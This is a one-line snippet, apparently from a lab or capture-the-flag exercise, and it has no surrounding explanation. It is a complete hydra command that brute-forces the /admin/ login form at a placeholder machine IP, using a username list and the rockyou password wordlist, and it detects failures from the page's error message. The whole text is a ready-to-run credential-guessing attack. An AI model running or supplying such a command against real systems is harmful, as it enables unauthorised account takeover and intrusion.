
```
hydra -L /path/username.txt -P /path/rockyou.txt <MACHINE_IP> http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
```
